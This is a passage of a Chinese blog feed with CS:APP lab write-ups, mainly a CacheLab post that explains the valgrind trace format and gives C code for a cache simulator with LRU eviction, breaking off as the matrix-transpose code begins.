rel="noopener">tsh.c</a><br>事实上在该项目下有我实验时候的完整环境，这是因为我发现该Lab是在不断更新的，当这篇blog被看到的时候可能实验内容已经有了改动，为了能<br>复现我当时的实验环境，我上传了完整的handout<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>因为最近时间越来越不够用了，blog只能划划水了。<br>这个实验最大的收获不是知识，而是知道了加个&amp;就能后台运行 (逃</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CS-APP-ShellLab&quot;&gt;&lt;a href=&quot;#CS-APP-ShellLab&quot; class=&quot;headerlink&quot; title=&quot;CS:APP ShellLab&quot;&gt;&lt;/a&gt;CS:APP ShellLab&lt;/h1&gt;&lt;p&gt;这一次实验是利用CS:APP第八章(
      
    
    </summary>
    
      <category term="csapp" scheme="lengyu.me/categories/csapp/"/>
    
    
      <category term="csapp" scheme="lengyu.me/tags/csapp/"/>
    
      <category term="工程向" scheme="lengyu.me/tags/%E5%B7%A5%E7%A8%8B%E5%90%91/"/>
    
      <category term="计算机体系" scheme="lengyu.me/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
  </entry>
  
  <entry>
    <title>CS:APP CacheLab</title>
    <link href="lengyu.me/2018/09/13/CS:APP-CacheLab/"/>
    <id>lengyu.me/2018/09/13/CS:APP-CacheLab/</id>
    <published>2018-09-12T23:35:10.000Z</published>
    <updated>2019-07-28T15:41:39.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CacheLab"><a href="#CacheLab" class="headerlink" title="CacheLab"></a>CacheLab</h1><p>这一章我们实战操作，编写一个模拟程序模拟存储器的缓存机制!</p><h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><p>通过存储器模拟实验和矩阵优化实验，实践cs:app第六章的内容，体会存储器体系的原理及学习如何利用局部性去优化程序性能。</p><h2 id="前置内容"><a href="#前置内容" class="headerlink" title="前置内容"></a>前置内容</h2><h2 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h2><p><a href="http://csapp.cs.cmu.edu/3e/cachelab.pdf" target="_blank" rel="noopener">实验指导书</a><br><a href="http://csapp.cs.cmu.edu/3e/cachelab-handout.tar" target="_blank" rel="noopener">实验材料</a></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="Reference-Trace-Files"><a href="#Reference-Trace-Files" class="headerlink" title="Reference Trace Files"></a>Reference Trace Files</h3><h4 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h4><p>这一部分的实验中，需要补全给出的csim.c文件，实现一个与给出的样例程序csim-ref反馈一致的缓存模拟器。<br>在这一部分的实验中需要接触到valgrind输出的文件,大概格式为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I 0400d7d4,8</span><br><span class="line">  M 0421c7f0,4</span><br><span class="line">  L 04f6b868,8</span><br><span class="line">  S 7ff0005c8,8</span><br></pre></td></tr></table></figure><p>其格式为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[space]operation address,size</span><br></pre></td></tr></table></figure><p>operation部分如果为”I”表示为指令读入，这是不影响缓存系统的。”M”表示修改,”L”表示读取,”S”表示写入。显然”M”可以看做”LS”的组合。address是一个<strong>64位</strong>的地址，size表示读入的地址块大小(实际上本实验中并未用到)。<br>现在需要模拟一个缓存系统，大致可以参考书p426的图6-25，统计命中，未命中，”驱逐(淘汰)”的次数，并与标准样例进行比较，得到分数(满分27)。</p><h4 id="注意细节"><a href="#注意细节" class="headerlink" title="注意细节"></a>注意细节</h4><ul><li><strong>本次实验的地址为64位地址，以16进制给出</strong></li><li>I是指令读，不算入内存操作</li><li>M一定会导致一次hit</li><li>利用scanf类似的函数读入给出的文件的时候”%s,%c”这样的format是无效的，后面的%c实际上是读不到的，需要自己写read函数</li><li>命令行解析很毒瘤，请使用getop</li><li>实验使用的make规则把所有warning看做error，所以该加括号的地方请加上括号.</li></ul><h4 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cachelab.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> false 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bool int</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxFileSize 300</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxAddrSize 30+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxBufSize 300</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Debug 0</span></span><br><span class="line"><span class="keyword">char</span> readBuf[maxBufSize];</span><br><span class="line"><span class="keyword">int</span> args_s,args_E,args_b;</span><br><span class="line"><span class="keyword">bool</span> flag_h,flag_v;</span><br><span class="line"><span class="keyword">int</span> <span class="keyword">args_t</span>;</span><br><span class="line"><span class="keyword">char</span> tracefile[maxFileSize];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseConsole</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *args[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">while</span>((ch=getopt(argc,args,<span class="string">"hvs:E:b:t:"</span>))!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (ch)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'h'</span>:flag_h=<span class="literal">true</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'v'</span>:flag_v=<span class="literal">true</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:<span class="built_in">sscanf</span>(optarg,<span class="string">"%d"</span>,&amp;args_s);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'E'</span>:<span class="built_in">sscanf</span>(optarg,<span class="string">"%d"</span>,&amp;args_E);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'b'</span>:<span class="built_in">sscanf</span>(optarg,<span class="string">"%d"</span>,&amp;args_b);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:<span class="built_in">sscanf</span>(optarg,<span class="string">"%s"</span>,tracefile);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheLine</span>&#123;</span></span><br><span class="line">    <span class="keyword">bool</span> isAlive;</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">int</span> acceseTime;</span><br><span class="line">&#125;Line;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Cache</span>&#123;</span></span><br><span class="line">    Line *line;</span><br><span class="line">&#125;Cache;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setCache</span><span class="params">(Cache *cache, <span class="keyword">int</span> cacheLineNumber)</span> </span>&#123;</span><br><span class="line">    cache-&gt;line = (Line *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Line) * cacheLineNumber);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cacheLineNumber; ++i) &#123;</span><br><span class="line">        cache-&gt;line[i].isAlive = <span class="literal">false</span>;</span><br><span class="line">        cache-&gt;line[i].flag = <span class="number">0</span>;</span><br><span class="line">        cache-&gt;line[i].acceseTime = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parseFlag</span><span class="params">(<span class="keyword">char</span>* addr, <span class="keyword">int</span>* flag, <span class="keyword">int</span>* cacheSetFlag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tempAddr;</span><br><span class="line">    <span class="built_in">sscanf</span>(addr,<span class="string">"%x"</span>,&amp;tempAddr);</span><br><span class="line">    tempAddr=tempAddr&gt;&gt;args_b;</span><br><span class="line">    <span class="keyword">if</span>(Debug)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x\n"</span>,tempAddr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> retFlag,retCacheSetFlag;</span><br><span class="line">    retFlag=retCacheSetFlag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=args_s<span class="number">-1</span>;i&gt;=<span class="number">0</span>;--i)</span><br><span class="line">    &#123;</span><br><span class="line">        retCacheSetFlag=retCacheSetFlag&lt;&lt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(((tempAddr&gt;&gt;i)&amp;<span class="number">1</span>)==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            retCacheSetFlag+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    tempAddr=tempAddr&gt;&gt;args_s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="keyword">args_t</span><span class="number">-1</span>;i&gt;=<span class="number">0</span>;--i)</span><br><span class="line">    &#123;</span><br><span class="line">        retFlag=retFlag&lt;&lt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(((tempAddr&gt;&gt;i)&amp;<span class="number">1</span>)==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            retFlag+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Debug)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Flag: %d\n"</span>,retFlag);</span><br><span class="line">    &#125;</span><br><span class="line">    *flag=retFlag;</span><br><span class="line">    *cacheSetFlag=retCacheSetFlag;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">readData</span><span class="params">(<span class="keyword">char</span> *op,<span class="keyword">char</span> *addr,<span class="keyword">int</span> *size,FILE* file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//char ch;</span></span><br><span class="line">    <span class="comment">//while((ch==getchar()))</span></span><br><span class="line">    <span class="keyword">char</span> *flag=<span class="literal">NULL</span>;</span><br><span class="line">    flag=fgets(readBuf,<span class="number">60</span>,file);</span><br><span class="line">    *op=<span class="string">'#'</span>;</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="literal">NULL</span>||feof(file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(readBuf);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(readBuf[i]==<span class="string">'\r'</span>||readBuf[i]==<span class="string">'\n'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(readBuf[i]==<span class="string">' '</span>&amp;&amp;*op!=<span class="string">'#'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(readBuf[i]==<span class="string">' '</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *op=readBuf[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;len;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(readBuf[i]==<span class="string">'\r'</span>||readBuf[i]==<span class="string">'\n'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(readBuf[i]==<span class="string">','</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            addr[k++]=readBuf[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    addr[k]=<span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">sscanf</span>(readBuf+i,<span class="string">"%d"</span>,size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *args[])</span> </span>&#123;</span><br><span class="line">    flag_h = flag_v = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> acParse = parseConsole(argc, args);</span><br><span class="line">    <span class="keyword">if</span> (acParse != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Parse args error!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">args_t</span>=<span class="number">64</span>-args_b-args_s;</span><br><span class="line">    <span class="keyword">int</span> cacheLineNumber = args_E;</span><br><span class="line">    <span class="keyword">int</span> cacheSetNumber = <span class="built_in">pow</span>(<span class="number">2</span>, args_s);</span><br><span class="line">    Cache *cache = (Cache *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Cache) * cacheSetNumber);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cacheSetNumber; ++i) &#123;</span><br><span class="line">        <span class="comment">//cache[i].init(cacheLineNumber);</span></span><br><span class="line">        setCache(&amp;cache[i], cacheLineNumber);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE *stream;</span><br><span class="line">    stream = fopen(tracefile, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (stream == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"NO such file!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//lseek(stream,0,SEEK_SET);</span></span><br><span class="line">    <span class="keyword">char</span> op;</span><br><span class="line">    <span class="keyword">char</span> addr[maxAddrSize];</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> miss_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hit_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> eviction_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> time_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(readData(&amp;op,addr,&amp;size,stream)==<span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        time_count++;</span><br><span class="line">        <span class="keyword">if</span> (op == <span class="string">'I'</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> flag, cacheSetFlag;</span><br><span class="line">        parseFlag(addr, &amp;flag, &amp;cacheSetFlag);</span><br><span class="line">        <span class="keyword">bool</span> ac = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">bool</span> evictionNum = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">bool</span> haveZero = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cacheLineNumber; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cache[cacheSetFlag].line[i].isAlive == <span class="literal">true</span> &amp;&amp; cache[cacheSetFlag].line[i].flag == flag) &#123;</span><br><span class="line">                ac = <span class="literal">true</span>;</span><br><span class="line">                hit_count++;</span><br><span class="line">                cache[cacheSetFlag].line[i].acceseTime = time_count;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (haveZero == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cache[cacheSetFlag].line[i].isAlive == <span class="literal">false</span>) &#123;</span><br><span class="line">                    haveZero = <span class="literal">true</span>;</span><br><span class="line">                    evictionNum = i;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (evictionNum == <span class="number">-1</span>) &#123;</span><br><span class="line">                        evictionNum = i;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cache[cacheSetFlag].line[i].acceseTime &lt;</span><br><span class="line">                               cache[cacheSetFlag].line[evictionNum].acceseTime) &#123;</span><br><span class="line">                        evictionNum = i;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//evicition</span></span><br><span class="line">        <span class="keyword">if</span> (ac == <span class="literal">false</span>) &#123;</span><br><span class="line">            miss_count++;</span><br><span class="line">            <span class="keyword">if</span> (haveZero == <span class="literal">false</span>) &#123;</span><br><span class="line">                eviction_count++;</span><br><span class="line">            &#125;</span><br><span class="line">            cache[cacheSetFlag].line[evictionNum].isAlive = <span class="literal">true</span>;</span><br><span class="line">            cache[cacheSetFlag].line[evictionNum].flag = flag;</span><br><span class="line">            cache[cacheSetFlag].line[evictionNum].acceseTime = time_count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (op == <span class="string">'M'</span>) &#123;</span><br><span class="line">            hit_count++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (flag_v == <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c %s"</span>, op, addr);</span><br><span class="line">            <span class="keyword">if</span> (ac) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">" hit"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">" miss"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((!haveZero&amp;&amp;!ac) == <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">" eviction"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (op == <span class="string">'M'</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">" hit"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Optimizing-Matrix-Transpose"><a href="#Optimizing-Matrix-Transpose" class="headerlink" title="Optimizing Matrix Transpose"></a>Optimizing Matrix Transpose</h3><h4 id="实验内容-1"><a href="#实验内容-1" class="headerlink" title="实验内容"></a>实验内容</h4><p>这一部分要利用所学的缓存部分的知识，然后采用各种蛇皮操作来降低矩阵转置过程中的缓存不命中的数量，主要是分块.</p><h4 id="注意细节-1"><a href="#注意细节-1" class="headerlink" title="注意细节"></a>注意细节</h4><ul><li>这个实验非常毒瘤，请参考<a href="https://wdxtub.com/2016/04/16/thick-csapp-lab-4/" target="_blank" rel="noopener">不周山之CacheLab的讲解,虽然这个讲解也很毒瘤</a></li><li>不止在读取矩阵的时候需要操作缓存，写入到新矩阵的时候也需要操作缓存</li><li><strong>注意”抖动”</strong>带来的多余miss</li><li>注意对角线带来的重复请求同一个组导致”驱逐(淘汰)”</li><li>三种情况应该分开处理，如果谋求一个完美的没有做分开处理的程序，几乎一定拿不到满分</li><li>即使你做了以上这些，你还是拿不到满分($64\times 64$非常毒瘤)</li></ul><h4 id="参考代码-1"><a href="#参考代码-1" class="headerlink" title="参考代码"></a>参考代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span 